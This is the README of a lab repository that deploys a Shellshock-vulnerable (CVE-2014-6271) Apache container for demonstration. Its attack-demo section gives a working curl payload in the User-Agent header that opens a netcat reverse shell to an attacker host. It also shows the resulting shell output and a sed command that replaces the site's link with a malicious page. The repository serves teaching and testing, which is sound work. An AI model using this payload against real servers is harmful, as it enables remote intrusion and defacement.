# CVE-2014-6271-Apache-Debian

## Overview
This Repo is PoC environment of [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271).  
You can deploy web site including vulernability using apache2 container image.  

## Usage
### Preparation
Build and deploy PoC container.  
~~
# docker build -t cve-2014-6271-apache-debian:buster .
# docker run -d -p 8080:80 cve-2014-6271-apache-debian:buster
~~

After the deployment is completed, you can browse the web page by accessing the following URL with a browser.  
You can access the k8s lab environment by clicking the link "Click!" under the web page.  
~~
http://<Container Host IP>:8080
~~

### Attack demo
In this demo, you can change the web page from Attacker Host (outside of container) exploiting vulernability of `CVE-2014-6271`.  


Exec these commands from attacke host. 
~~
Terminal 1
# nc -nvlp 5050

Terminal 2
# curl -H "user-agent: () { :; }; echo; echo; /bin/nc -e /bin/bash <Attacker Host IP> 5050" http://<Container Host IP>:8080/cgi-bin/vulnerable
~~

After that, you can see that the `/bin/bash` of the PoC container can be executed in the terminal 1.  
~~
Listening on 0.0.0.0 5050
Connection received on 172.17.0.2 38926
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(wheel)
pwd
/usr/lib/cgi-bin
~~

Change the link "Click!" of web page.  
In this case, we use dummy page for malicious link.  
~~
sudo sed -i -e 's/https\:\/\/www.katacoda.com\/courses\/kubernetes/danger.html/' /var/www/html/index.html
~~

Access the web page again and clicking the link "Click!" under the web page.  
~~
http://<Container Host IP>:8080
~~

## Reference
https://github.com/hmlio/vaas-cve-2014-6271  
https://github.com/opsxcq/exploit-CVE-2014-6271  
